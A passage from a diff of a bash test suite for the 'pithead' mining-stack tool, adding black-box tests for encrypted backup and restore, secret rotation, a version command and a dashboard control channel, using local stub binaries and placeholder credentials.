 *basic_auth*) bad "auth disable drops basic_auth" "basic_auth still present in the Caddyfile" ;;
 *) ok "auth disable drops basic_auth" ;;
 esac
+
+echo "== black-box: tor.auto_heal renders to .env (#424) =="
+# The dashboard's healer reads TOR_AUTO_HEAL from .env. Key absent -> off (the stack never
+# restarts its privacy boundary unbidden); explicit true -> on.
+seed_env
+printf '{ "monero": {"mode":"local","wallet_address":"%s","node_username":"u","node_password":"p"}, "tari":{"wallet_address":"T"}, "p2pool":{"pool":"main"}, "dashboard":{"secure":true,"host":"box.lan"} }\n' "$WALLET" >"$V/config.json"
+out="$(cd "$V" && PATH="$V/bin:$PATH" ./pithead apply -y 2>&1)"
+assert_eq "tor.auto_heal defaults to off" "$(run_sourced "$V" env_get_file "$V/.env" TOR_AUTO_HEAL)" "false"
+seed_env
+printf '{ "monero": {"mode":"local","wallet_address":"%s","node_username":"u","node_password":"p"}, "tari":{"wallet_address":"T"}, "p2pool":{"pool":"main"}, "tor":{"auto_heal":true}, "dashboard":{"secure":true,"host":"box.lan"} }\n' "$WALLET" >"$V/config.json"
+out="$(cd "$V" && PATH="$V/bin:$PATH" ./pithead apply -y 2>&1)"
+assert_eq "tor.auto_heal opt-in renders true" "$(run_sourced "$V" env_get_file "$V/.env" TOR_AUTO_HEAL)" "true"
 
 echo "== black-box: apply preserves secrets + propagates =="
 seed_env
@@ -2437,11 +2910,37 @@ esac
 EOF
 printf '#!/usr/bin/env bash\nexit 0\n' >"$DOC/bin/sudo"
 chmod +x "$DOC/bin/docker" "$DOC/bin/sudo"
+printf '9.9.9\n' >"$DOC/VERSION" # #386: doctor's header must carry the stack version
 out="$(cd "$DOC" && PATH="$DOC/bin:$PATH" ./pithead doctor 2>&1)"
 rc=$?
 assert_contains "doctor runs to the summary" "$out" "Diagnostics summary"
 assert_contains "doctor flags the unreachable daemon" "$out" "Docker daemon is not reachable"
 assert_rc "doctor exits 1 on a critical FAIL" "$rc" "1"
+assert_contains "doctor header carries the version (#386)" "$out" "Version: pithead v9.9.9"
+
+echo "== black-box: version subcommand (#386) =="
+# The version identity must print offline and exit 0 before any setup, on both a release bundle
+# (VERSION present, no Dockerfile) and a source checkout (Dockerfile marker), and read the value
+# export_build_provenance computed — no VERSION file falls back to `unknown`, still exit 0.
+VER="$SANDBOX/version"
+mkdir -p "$VER"
+cp "$STACK" "$VER/pithead"
+printf '9.9.9\n' >"$VER/VERSION"
+out="$(cd "$VER" && ./pithead version)"
+rc=$?
+assert_rc "version: exits 0" "$rc" "0"
+assert_contains "version: prints the VERSION contents" "$out" "v9.9.9"
+assert_contains "version: -V alias" "$(cd "$VER" && ./pithead -V)" "v9.9.9"
+assert_contains "version: --version alias" "$(cd "$VER" && ./pithead --version)" "v9.9.9"
+mkdir -p "$VER/build/dashboard"
+: >"$VER/build/dashboard/Dockerfile"
+assert_contains "version: source checkout reads dev" "$(cd "$VER" && ./pithead version)" "pithead dev"
+rm -rf "$VER/build"
+rm -f "$VER/VERSION"
+out="$(cd "$VER" && ./pithead version)"
+rc=$?
+assert_rc "version: no VERSION still exits 0" "$rc" "0"
+assert_contains "version: no VERSION -> unknown" "$out" "unknown"
 
 echo "== black-box: backup -> restore round-trip (#140) =="
 # backup/restore touch irreplaceable state (onion keys, the dashboard DB) and have fiddly logic
@@ -2486,8 +2985,10 @@ printf 'CADDY-ORIG\n' >"$BK/Caddyfile"
 printf 'ONIONKEY-ORIG\n' >"$BK/data/tor/hs_ed25519_secret_key"
 printf 'DBDATA-ORIG\n' >"$BK/data/dashboard/dashboard.db"
 
-# 1) Backup creates a timestamped archive.
-out="$(cd "$BK" && PATH="$BK/bin:$PATH" ./pithead backup -y 2>&1)"
+# 1) Backup creates a timestamped archive. --no-encrypt keeps this #140 round-trip on the plaintext
+# path (encryption is exercised in the #374 block below); an unattended run without a passphrase
+# now refuses rather than downgrading, so the flag is required here.
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" ./pithead backup -y --no-encrypt 2>&1)"
 rc=$?
 assert_rc "backup exits 0" "$rc" "0"
 archive="$(ls "$BK"/backups/pithead-backup-*.tar.gz 2>/dev/null | head -1)"
@@ -2529,14 +3030,140 @@ printf '%s\n' 'Filesystem 1024-blocks Used Available Capacity Mounted on' '/dev/
 EOF
 chmod +x "$BK/bin/df"
 rm -f "$BK"/backups/pithead-backup-*.tar.gz
-out="$(cd "$BK" && printf 'n\n' | PATH="$BK/bin:$PATH" ./pithead backup 2>&1)"
+# stdin answers two prompts since #374: empty passphrase (-> plaintext fallback), then 'n'.
+out="$(cd "$BK" && printf '\nn\n' | PATH="$BK/bin:$PATH" ./pithead backup 2>&1)"
 assert_contains "low-space prompt, then cancel" "$out" "ancelled"
 leftover="$(ls "$BK"/backups/pithead-backup-*.tar.gz 2>/dev/null | head -1)"
 assert_eq "cancelled backup writes no archive" "$leftover" ""
-out="$(cd "$BK" && PATH="$BK/bin:$PATH" ./pithead backup -y 2>&1)"
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" ./pithead backup -y --no-encrypt 2>&1)"
 rc=$?
 assert_rc "low-space backup proceeds with --yes" "$rc" "0"
 assert_contains "low-space backup warns first" "$out" "Low free space"
+
+echo "== black-box: encrypted backup -> restore (#374) =="
+# The archive holds the stack's full secret material (onion keys, .env, dashboard DB), so backup
+# encrypts by default (openssl aes-256-cbc + pbkdf2). Covered here: the unattended-without-
+# passphrase REFUSAL (an automated run must never silently downgrade to plaintext), the explicit
+# --no-encrypt opt-out, env-var and prompt encrypt round-trips, wrong-passphrase rejection BEFORE
+# anything is touched, a tamper/truncation refusal before extraction, legacy/garbage archives, and
+# that a failed encrypted backup leaves no file behind (the tar|openssl stream means no plaintext
+# temp ever).
+rm -f "$BK/bin/df" "$BK"/backups/pithead-backup-*
+
+# 1a) --yes with no passphrase REFUSES (no silent plaintext downgrade for cron); writes nothing.
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" ./pithead backup -y 2>&1)"
+rc=$?
+[ "$rc" -ne 0 ] && ok "unattended backup without passphrase exits non-zero" || bad "unattended backup without passphrase exits non-zero" "rc=0"
+assert_contains "refusal names the missing passphrase" "$out" "PITHEAD_BACKUP_PASSPHRASE"
+assert_eq "refused unattended backup writes no archive" "$(ls "$BK"/backups/pithead-backup-* 2>/dev/null | head -1)" ""
+# 1b) --no-encrypt is the explicit plaintext opt-out (loud warning, exits 0, writes a plain archive).
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" ./pithead backup -y --no-encrypt 2>&1)"
+rc=$?
+assert_rc "explicit --no-encrypt backup exits 0" "$rc" "0"
+plain_optout="$(ls "$BK"/backups/pithead-backup-*.tar.gz 2>/dev/null | head -1)"
+{ [ -n "$plain_optout" ] && [ -f "$plain_optout" ]; } && ok "--no-encrypt writes a plaintext archive" || bad "--no-encrypt writes a plaintext archive" "no plain archive"
+rm -f "$BK"/backups/pithead-backup-*
+
+# 2) Env-var passphrase: a .enc archive with the openssl Salted__ header, no plaintext twin.
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" PITHEAD_BACKUP_PASSPHRASE=hunter2 ./pithead backup -y 2>&1)"
+rc=$?
+assert_rc "encrypted backup exits 0" "$rc" "0"
+enc_archive="$(ls "$BK"/backups/pithead-backup-*.tar.gz.enc 2>/dev/null | head -1)"
+{ [ -n "$enc_archive" ] && [ -f "$enc_archive" ]; } && ok "encrypted archive created (.enc)" || bad "encrypted archive created (.enc)" "no .enc under backups/"
+assert_eq "archive starts with Salted__" "$(head -c 8 "$enc_archive")" "Salted__"
+plain_left="$(ls "$BK"/backups/*.tar.gz 2>/dev/null | head -1)"
+assert_eq "no plaintext archive alongside the .enc" "$plain_left" ""
+assert_contains "backup says to store the passphrase elsewhere" "$out" "passphrase"
+
+# 3) Wrong passphrase: restore fails loudly before tar runs — live files untouched.
+printf 'CADDY-LIVE\n' >"$BK/Caddyfile"
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" PITHEAD_BACKUP_PASSPHRASE=wrong ./pithead restore -y "$enc_archive" 2>&1)"
+rc=$?
+[ "$rc" -ne 0 ] && ok "wrong passphrase exits non-zero" || bad "wrong passphrase exits non-zero" "rc=0"
+assert_contains "wrong passphrase names the cause" "$out" "rong passphrase"
+assert_eq "wrong passphrase leaves live files untouched" "$(cat "$BK/Caddyfile")" "CADDY-LIVE"
+
+# 4) Right passphrase, via the prompt this time: full round-trip (archive was taken while the
+# files held their -ORIG values, so restore must bring those back over the corrupted ones).
+printf 'CORRUPTED\n' >"$BK/data/dashboard/dashboard.db"
+rm -f "$BK/data/tor/hs_ed25519_secret_key"
+out="$(cd "$BK" && printf 'hunter2\n' | PATH="$BK/bin:$PATH" ./pithead restore -y "$enc_archive" 2>&1)"
+rc=$?
+assert_rc "encrypted restore exits 0" "$rc" "0"
+assert_eq "encrypted restore brings back the Caddyfile" "$(cat "$BK/Caddyfile")" "CADDY-ORIG"
+assert_eq "encrypted restore brings back the dashboard db" "$(cat "$BK/data/dashboard/dashboard.db")" "DBDATA-ORIG"
+assert_eq "encrypted restore brings back the onion key" "$(cat "$BK/data/tor/hs_ed25519_secret_key" 2>/dev/null)" "ONIONKEY-ORIG"
+
+# 4b) Tampered/truncated ciphertext (CBC has no MAC): a flip past the first block passes the
+# cheap magic pre-flight but must be caught by the full-stream verify BEFORE tar writes anything,
+# so the live files survive. Truncating the archive tail simulates corruption/tampering.
+printf 'CADDY-LIVE\n' >"$BK/Caddyfile"
+head -c $(($(wc -c <"$enc_archive") - 32)) "$enc_archive" >"$BK/backups/truncated.tar.gz.enc"
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" PITHEAD_BACKUP_PASSPHRASE=hunter2 ./pithead restore -y "$BK/backups/truncated.tar.gz.enc" 2>&1)"
+rc=$?
+[ "$rc" -ne 0 ] && ok "tampered archive exits non-zero" || bad "tampered archive exits non-zero" "rc=0"
+assert_contains "tampered archive names integrity failure" "$out" "integrity"
+assert_eq "tampered archive leaves live files untouched" "$(cat "$BK/Caddyfile")" "CADDY-LIVE"
+rm -f "$BK"/backups/pithead-backup-* "$BK/backups/truncated.tar.gz.enc"
+# Leave the fixtures as this block found them (the round-trip above restored -ORIG) so the
+# later plaintext-backup test captures -ORIG, not this test's probe value.
+printf 'CADDY-ORIG\n' >"$BK/Caddyfile"
+
+# 5) Interactive prompt path: passphrase typed twice encrypts; a mismatch aborts with no archive.
+out="$(cd "$BK" && printf 'pw\npw\n' | PATH="$BK/bin:$PATH" ./pithead backup 2>&1)"
+rc=$?
+assert_rc "prompted encrypted backup exits 0" "$rc" "0"
+enc_archive="$(ls "$BK"/backups/pithead-backup-*.tar.gz.enc 2>/dev/null | head -1)"
+assert_eq "prompted backup writes Salted__" "$(head -c 8 "$enc_archive")" "Salted__"
+rm -f "$BK"/backups/pithead-backup-*
+out="$(cd "$BK" && printf 'pw\nother\n' | PATH="$BK/bin:$PATH" ./pithead backup 2>&1)"
+rc=$?
+[ "$rc" -ne 0 ] && ok "passphrase mismatch exits non-zero" || bad "passphrase mismatch exits non-zero" "rc=0"
+assert_contains "passphrase mismatch says so" "$out" "do not match"
+assert_eq "passphrase mismatch writes no archive" "$(ls "$BK"/backups/pithead-backup-* 2>/dev/null | head -1)" ""
+
+# 6) --no-encrypt forces plaintext even with the env var set, and that legacy-format archive
+# still restores through the gzip path (magic-byte detection, no flag).
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" PITHEAD_BACKUP_PASSPHRASE=hunter2 ./pithead backup -y --no-encrypt 2>&1)"
+rc=$?
+assert_rc "--no-encrypt backup exits 0" "$rc" "0"
+plain_archive="$(ls "$BK"/backups/pithead-backup-*.tar.gz 2>/dev/null | head -1)"
+{ [ -n "$plain_archive" ] && gzip -t "$plain_archive" 2>/dev/null; } && ok "--no-encrypt writes plain gzip" || bad "--no-encrypt writes plain gzip" "missing or not gzip"
+printf 'CORRUPTED\n' >"$BK/Caddyfile"
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" ./pithead restore -y "$plain_archive" 2>&1)"
+rc=$?
+assert_rc "plaintext archive still restores" "$rc" "0"
+assert_eq "plaintext restore brings back the Caddyfile" "$(cat "$BK/Caddyfile")" "CADDY-ORIG"
+rm -f "$BK"/backups/pithead-backup-*
+
+# 7) A failed encrypted backup (openssl dies mid-stream) removes the partial archive.
+cat >"$BK/bin/openssl" <<'EOF'
+#!/usr/bin/env bash
+exit 1
+EOF
+chmod +x "$BK/bin/openssl"
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" PITHEAD_BACKUP_PASSPHRASE=x ./pithead backup -y 2>&1)"
+rc=$?
+[ "$rc" -ne 0 ] && ok "failed encrypted backup exits non-zero" || bad "failed encrypted backup exits non-zero" "rc=0"
+assert_eq "failed encrypted backup leaves nothing behind" "$(ls "$BK"/backups/pithead-backup-* 2>/dev/null | head -1)" ""
+rm -f "$BK/bin/openssl"
+
+# 8) An archive that is neither encrypted nor gzip is refused before the overwrite prompt.
+printf 'garbage-not-an-archive' >"$BK/backups/bogus.tar.gz"
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" ./pithead restore -y "$BK/backups/bogus.tar.gz" 2>&1)"
+rc=$?
+[ "$rc" -ne 0 ] && ok "garbage archive is refused" || bad "garbage archive is refused" "rc=0"
+assert_contains "garbage archive names the problem" "$out" "Not a pithead backup archive"
+rm -f "$BK"/backups/bogus.tar.gz
+
+# 9) Restore of an encrypted archive with no passphrase available (piped empty stdin) fails clean.
+out="$(cd "$BK" && PATH="$BK/bin:$PATH" PITHEAD_BACKUP_PASSPHRASE=hunter2 ./pithead backup -y 2>&1)"
+enc_archive="$(ls "$BK"/backups/pithead-backup-*.tar.gz.enc 2>/dev/null | head -1)"
+out="$(cd "$BK" && printf '' | PATH="$BK/bin:$PATH" ./pithead restore -y "$enc_archive" 2>&1)"
+rc=$?
+[ "$rc" -ne 0 ] && ok "encrypted restore w/o passphrase exits non-zero" || bad "encrypted restore w/o passphrase exits non-zero" "rc=0"
+assert_contains "encrypted restore w/o passphrase explains" "$out" "PITHEAD_BACKUP_PASSPHRASE"
+rm -f "$BK"/backups/pithead-backup-*
 
 echo "== black-box: reset-dashboard targets .env dirs, not config.json (#139) =="
 # reset-dashboard must wipe the LIVE deployment's data dirs (from .env), not a path the user may
@@ -2576,6 +3203,107 @@ out="$(cd "$R" && SUDO_LOG=/dev/null PATH="$R/bin:$PATH" ./pithead reset-dashboa
 rc=$?
 assert_rc "reset refuses with no data dirs in .env" "$rc" "1"
 assert_contains "reset refuse message" "$out" "refusing to guess"
+
+echo "== black-box: rotate-secrets regenerates the internal credentials (#378) =="
+# One command rotates the local Monero RPC password, the "auto" stratum password, and
+# PROXY_AUTH_TOKEN — the three values apply/load_preserved_state otherwise preserve forever.
+# Baseline: an applied local-mode config with stratum auth on "auto".
+seed_env
+printf '{ "monero": {"mode":"local","wallet_address":"%s","node_username":"u","node_password":"oldrpcpass"}, "tari":{"wallet_address":"T"}, "p2pool":{"pool":"mini","stratum_password":"auto"}, "dashboard":{"secure":false,"host":"box.lan"} }\n' "$WALLET" >"$V/config.json"
+out="$(cd "$V" && DOCKER_LOG="$DOCKER_LOG" PATH="$V/bin:$PATH" ./pithead apply -y 2>&1)"
+rot_sp_old="$(run_sourced "$V" env_get_file "$V/.env" PROXY_STRATUM_PASSWORD)"
+rm -f "$V"/config.json.bak-* "$V"/.env.bak-*
+: >"$DOCKER_LOG"
+out="$(cd "$V" && DOCKER_LOG="$DOCKER_LOG" PATH="$V/bin:$PATH" ./pithead rotate-secrets -y 2>&1)"
+rc=$?
+assert_rc "rotate-secrets exits 0" "$rc" "0"
+rot_pass="$(run_sourced "$V" env_get_file "$V/.env" MONERO_NODE_PASSWORD)"
+rot_sp="$(run_sourced "$V" env_get_file "$V/.env" PROXY_STRATUM_PASSWORD)"
+rot_token="$(run_sourced "$V" env_get_file "$V/.env" PROXY_AUTH_TOKEN)"
+assert_eq "RPC password rotated (32 chars)" "${#rot_pass}" "32"
+assert_eq "RPC password changed" "$([ "$rot_pass" != "oldrpcpass" ] && echo changed)" "changed"
+assert_eq "new RPC password persisted to config.json" "$(jq -r '.monero.node_password' "$V/config.json")" "$rot_pass"
+assert_eq "stratum password changed" "$([ -n "$rot_sp" ] && [ "$rot_sp" != "$rot_sp_old" ] && echo changed)" "changed"
+assert_eq "proxy token changed" "$([ -n "$rot_token" ] && [ "$rot_token" != "ORIGINALTOKEN" ] && echo changed)" "changed"
+assert_eq "DEPLOYMENT_COMPLETED survives the rotate (#356)" "$(run_sourced "$V" env_get_file "$V/.env" DEPLOYMENT_COMPLETED)" "true"
+# Consumers: the containers are RECREATED via compose up (env/args re-read), never `compose restart`
+# (which would reuse p2pool's old --rpc-login args).
+assert_contains "rotate recreates via compose up" "$(cat "$DOCKER_LOG")" "compose up"
+assert_not_contains "rotate never uses compose restart" "$(cat "$DOCKER_LOG")" "compose restart"
+# Secrets stay out of the command output — except the stratum password, deliberately surfaced via
+# announce_stratum_auth so the operator can update each rig's 'pass'.
+case "$out" in
+*"$rot_pass"* | *"$rot_token"*) bad "rotate never prints the RPC password / proxy token" "leaked in: $out" ;;
+*) ok "rotate never prints the RPC password / proxy token" ;;
+esac
+assert_contains "rotate surfaces the new stratum password for rigs" "$out" "Stratum authentication is ON"
+assert_contains "rotate warns that rigs are rejected until updated" "$out" "rejected"
+# Recoverability: the pre-rotation copies hold the OLD values, owner-only.
+rot_cfg_bak="$(ls "$V"/config.json.bak-* 2>/dev/null | head -1)"
+rot_env_bak="$(ls "$V"/.env.bak-* 2>/dev/null | head -1)"
+assert_eq "config.json safety copy holds the old RPC password" "$(jq -r '.monero.node_password' "${rot_cfg_bak:-/dev/null}" 2>/dev/null)" "oldrpcpass"
+assert_contains ".env safety copy holds the old proxy token" "$(cat "${rot_env_bak:-/dev/null}" 2>/dev/null)" "ORIGINALTOKEN"
+rot_bak_mode="$(stat -c '%a' "$rot_env_bak" 2>/dev/null || stat -f '%Lp' "$rot_env_bak" 2>/dev/null)"
+assert_eq "safety copies are owner-only (600)" "$rot_bak_mode" "600"
+# Persistence: a follow-up apply reports no changes — the preservation logic now carries the NEW
+# values instead of resurrecting the old ones. (This is exactly the assertion that fails if
+# rotate silently no-ops: the preserved values would never have changed.)
+out="$(cd "$V" && DOCKER_LOG="$DOCKER_LOG" PATH="$V/bin:$PATH" ./pithead apply -y 2>&1)"
+assert_contains "apply after rotate reports no changes" "$out" "No configuration changes detected"
+assert_eq "rotated token survives the next apply" "$(run_sourced "$V" env_get_file "$V/.env" PROXY_AUTH_TOKEN)" "$rot_token"
+
+echo "== black-box: rotate-secrets skips what it must (#378) =="
+# Remote mode: the RPC credential belongs to the remote node — config.json stays untouched.
+seed_env
+printf '{ "monero": {"mode":"remote","wallet_address":"%s","node_username":"ru","node_password":"remotepass","remote":{"host":"node.example.com"}}, "tari":{"wallet_address":"T"}, "p2pool":{"pool":"mini"}, "dashboard":{"secure":false,"host":"box.lan"} }\n' "$WALLET" >"$V/config.json"
+out="$(cd "$V" && DOCKER_LOG="$DOCKER_LOG" PATH="$V/bin:$PATH" ./pithead apply -y 2>&1)"
+out="$(cd "$V" && DOCKER_LOG="$DOCKER_LOG" PATH="$V/bin:$PATH" ./pithead rotate-secrets -y 2>&1)"
+assert_rc "rotate-secrets (remote) exits 0" "$?" "0"
+assert_eq "remote RPC password untouched" "$(jq -r '.monero.node_password' "$V/config.json")" "remotepass"
+assert_contains "remote skip is explained" "$out" "remote"
+assert_eq "proxy token still rotates in remote mode" "$([ "$(run_sourced "$V" env_get_file "$V/.env" PROXY_AUTH_TOKEN)" != "ORIGINALTOKEN" ] && echo changed)" "changed"
+
+# Literal stratum password: lives in config.json, so rotate leaves it and points there instead.
+seed_env
+printf '{ "monero": {"mode":"local","wallet_address":"%s","node_username":"u","node_password":"p"}, "tari":{"wallet_address":"T"}, "p2pool":{"pool":"mini","stratum_password":"my.literal-pass"}, "dashboard":{"secure":false,"host":"box.lan"} }\n' "$WALLET" >"$V/config.json"
+out="$(cd "$V" && DOCKER_LOG="$DOCKER_LOG" PATH="$V/bin:$PATH" ./pithead apply -y 2>&1)"
+out="$(cd "$V" && DOCKER_LOG="$DOCKER_LOG" PATH="$V/bin:$PATH" ./pithead rotate-secrets -y 2>&1)"
+assert_eq "literal stratum password untouched" "$(run_sourced "$V" env_get_file "$V/.env" PROXY_STRATUM_PASSWORD)" "my.literal-pass"
+assert_contains "literal skip points at config.json" "$out" "config.json"
+
+# Declined prompt (no -y): nothing changes.
+rot_token_now="$(run_sourced "$V" env_get_file "$V/.env" PROXY_AUTH_TOKEN)"
+out="$(cd "$V" && DOCKER_LOG="$DOCKER_LOG" PATH="$V/bin:$PATH" sh -c 'echo n | ./pithead rotate-secrets' 2>&1)"
+assert_rc "declined rotate exits 0" "$?" "0"
+assert_contains "declined rotate says cancelled" "$out" "cancelled"
+assert_eq "declined rotate changes nothing" "$(run_sourced "$V" env_get_file "$V/.env" PROXY_AUTH_TOKEN)" "$rot_token_now"
+
+echo "== black-box: rotate-secrets failure path keeps the old values recoverable (#378) =="
+# A failed recreate must exit non-zero, leave the retry marker (#125) so `apply` re-attempts the
+# recreate, and point at the safety copies that still hold the old secrets.
+FDOCK="$SANDBOX/faildocker"
+mkdir -p "$FDOCK"
+cat >"$FDOCK/docker" <<'EOF'
+#!/usr/bin/env bash
+case "$*" in
+  "compose version"|"info") exit 0 ;;
+  compose\ up*) echo "boom: no space left on device"; exit 1 ;;
+esac
+exit 0
+EOF
+chmod +x "$FDOCK/docker"
+seed_env
+printf '{ "monero": {"mode":"local","wallet_address":"%s","node_username":"u","node_password":"failoldpass"}, "tari":{"wallet_address":"T"}, "p2pool":{"pool":"mini"}, "dashboard":{"secure":false,"host":"box.lan"} }\n' "$WALLET" >"$V/config.json"
+out="$(cd "$V" && DOCKER_LOG="$DOCKER_LOG" PATH="$V/bin:$PATH" ./pithead apply -y 2>&1)"
+rm -f "$V"/config.json.bak-* "$V"/.env.bak-* "$V/.env.apply-incomplete"
+out="$(cd "$V" && PATH="$FDOCK:$V/bin:$PATH" ./pithead rotate-secrets -y 2>&1)"
+rc=$?
+assert_rc "failed recreate exits non-zero" "$rc" "1"
+assert_contains "failure names the retry path" "$out" "apply"
+[ -f "$V/.env.apply-incomplete" ] && ok "failure leaves the retry marker (#125)" || bad "failure leaves the retry marker (#125)" "marker missing"
+assert_eq "safety copy still holds the pre-rotation RPC password" "$(jq -r '.monero.node_password' "$(ls "$V"/config.json.bak-* | head -1)")" "failoldpass"
+assert_contains "safety copy still holds the pre-rotation token" "$(cat "$(ls "$V"/.env.bak-* | head -1)")" "ORIGINALTOKEN"
+rm -f "$V/.env.apply-incomplete" "$V"/config.json.bak-* "$V"/.env.bak-*
 
 echo "== release: install bundle is free of macOS xattr pax headers (#252) =="
 # Static guard: make_bundle must keep `--no-xattrs` AND the post-bundle xattr assertion, so the
@@ -2645,6 +3373,754 @@ assert_contains "tor entrypoint: onion also exposes :443 for the Tor-Browser htt
     "$tor_onion_on" "HiddenServicePort 443 10.9.0.1:443"
 assert_not_contains "tor entrypoint: no dashboard onion when disabled (default off) (#343)" \
     "$(tor_torrc false)" "Dashboard Hidden Service"
+
+# ---------------------------------------------------------------------------
+echo "== black-box: dashboard control channel (#33) =="
+# A deployed sandbox with the control channel on: config carries a dashboard password (required)
+# and dashboard.control.enabled, docker/sudo stubbed. The runner is exercised end-to-end against
+# real spool files; `apply` inside it runs this same sandboxed pithead.
+C="$SANDBOX/control"
+mkdir -p "$C/build/tari" "$C/build/dashboard" \
+    "$C/data/monero" "$C/data/tari" "$C/data/p2pool/stats" "$C/data/tor" "$C/data/dashboard"
+: >"$C/build/dashboard/Dockerfile"
+cp "$STACK" "$C/pithead"
+make_stubs "$C/bin"
+cp "$ROOT/build/tari/config.toml.template" "$C/build/tari/"
+# The password hash step reads the pinned Caddy image out of docker-compose.yml (#8).
+cp "$ROOT/docker-compose.yml" "$C/docker-compose.yml"
+CTRL_LOG="$C/docker.log"
+seed_control_env() {
+    cat >"$C/.env" <<EOF
+MONERO_ONION_ADDRESS=mona.onion
+TARI_ONION_ADDRESS=taria.onion
+P2POOL_ONION_ADDRESS=p2pa.onion
+PROXY_AUTH_TOKEN=ORIGINALTOKEN
+HOST_IP=box.lan
+DEPLOYMENT_COMPLETED=true
+COMPOSE_PROFILES=local_node
+EOF
+}
+control_config() { # <pool> [extra dashboard keys...] -> writes $C/config.json
+    printf '{ "monero":{"mode":"local","wallet_address":"%s","node_username":"u","node_password":"p"},
+              "tari":{"wallet_address":"T"}, "p2pool":{"pool":"%s"},
+              "dashboard":{"secure":true,"host":"box.lan",
+                           "auth":{"username":"admin","password":"a control passphrase"},
+                           "control":{"enabled":true}} }\n' "$WALLET" "$1" >"$C/config.json"
+}
+
+# Fail-closed: enabling the control channel without a dashboard password must not validate.
+seed_control_env
+printf '{ "monero":{"mode":"local","wallet_address":"%s","node_username":"u","node_password":"p"},
+          "tari":{"wallet_address":"T"}, "p2pool":{"pool":"main"},
+          "dashboard":{"secure":true,"host":"box.lan","control":{"enabled":true}} }\n' "$WALLET" >"$C/config.json"
+out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply -y 2>&1)"
+rc=$?
+assert_rc "control.enabled without a password is rejected" "$rc" "1"
+assert_contains "control-without-password message names the flag" "$out" "dashboard.control.enabled"
+
+# Baseline: control enabled + password, pool main → a rendered .env with the control keys.
+seed_control_env
+control_config main
+out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply -y 2>&1)"
+assert_rc "baseline apply with control enabled succeeds" "$?" "0"
+assert_contains "control toggle rendered to .env" "$(cat "$C/.env")" "DASHBOARD_CONTROL_ENABLED=true"
+assert_contains "control spool dir rendered to .env" "$(cat "$C/.env")" "CONTROL_DIR=$C/data/control"
+[ -d "$C/data/control/requests" ] && [ -d "$C/data/control/staged" ] &&
+    [ -d "$C/data/control/results" ] && [ -d "$C/data/control/audit" ] &&
+    ok "control spool dirs created" || bad "control spool dirs created" "missing under $C/data/control"
+assert_contains "caddy access-log dir rendered to .env (#349)" "$(cat "$C/.env")" "CADDY_LOG_DIR=$C/data/caddy-logs"
+[ -d "$C/data/caddy-logs" ] && ok "caddy access-log dir created (#349)" || bad "caddy access-log dir created (#349)" "missing"
+
+echo "== black-box: apply --dry-run [--porcelain] (#33) =="
+control_config mini # candidate change: pool main -> mini
+cp "$C/.env" "$C/env.before"
+: >"$CTRL_LOG"
+out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply --dry-run --porcelain 2>/dev/null)"
+assert_rc "dry-run --porcelain exits 0" "$?" "0"
+assert_contains "porcelain emits FLAG<TAB>KEY<TAB>MSG rows" "$out" "$(printf 'INFO\tP2POOL_FLAGS\t')"
+assert_contains "porcelain row carries the describe_change message" "$out" "P2Pool sidechain changing"
+if cmp -s "$C/.env" "$C/env.before"; then ok "dry-run leaves .env untouched"; else bad "dry-run leaves .env untouched" ".env changed"; fi
+case "$(grep 'compose up' "$CTRL_LOG" 2>/dev/null || true)" in
+"") ok "dry-run touches no container" ;;
+*) bad "dry-run touches no container" "docker compose up was called" ;;
+esac
+[ ! -f "$C/.env.dryrun" ] && ok "dry-run staging file removed" || bad "dry-run staging file removed" ".env.dryrun left behind"
+# Human (non-porcelain) preview prints the bullet form of the same row.
+out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" NO_COLOR=1 ./pithead apply --dry-run 2>/dev/null)"
+assert_contains "human dry-run prints the preview bullet" "$out" "• P2Pool sidechain changing"
+# --porcelain without --dry-run is refused (it would silently look like a real apply).
+out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply --porcelain 2>&1)"
+assert_rc "--porcelain without --dry-run is rejected" "$?" "1"
+
+# PITHEAD_CONFIG_FILE points ONE invocation at a candidate config; config.json is not consulted.
+control_config main # config.json back to the applied state (no changes)
+printf '{ "monero":{"mode":"local","wallet_address":"%s","node_username":"u","node_password":"p"},
+          "tari":{"wallet_address":"T"}, "p2pool":{"pool":"nano"},
+          "dashboard":{"secure":true,"host":"box.lan",
+                       "auth":{"username":"admin","password":"a control passphrase"},
+                       "control":{"enabled":true}} }\n' "$WALLET" >"$C/alt.json"
+out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" PITHEAD_CONFIG_FILE="$C/alt.json" ./pithead apply --dry-run --porcelain 2>/dev/null)"
+assert_contains "PITHEAD_CONFIG_FILE override is honoured" "$out" "37890" # nano's p2p port
+out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply --dry-run --porcelain 2>/dev/null)"
+assert_eq "without the override, config.json shows no changes" "$out" ""
+
+echo "== black-box: control-run-pending (#33) =="
+UUID1="11111111-1111-4111-8111-111111111111"
+UUID2="22222222-2222-4222-8222-222222222222"
+REQS="$C/data/control/requests"
+RESULTS="$C/data/control/results"
+STAGED="$C/data/control/staged"
+AUDIT="$C/data/control/audit/control.log"
+run_pending() { (cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead control-run-pending 2>&1); }
+
+# Preview: a valid typed intent (pool main -> mini) → previewed result + a host-side staged copy.
+jq -n --arg w "$WALLET" --arg id "$UUID1" '{id:$id, action:"preview", actor:"admin", config:{
+    monero:{mode:"local",wallet_address:$w,node_username:"u",node_password:"p"},
+    tari:{wallet_address:"T"}, p2pool:{pool:"mini"},
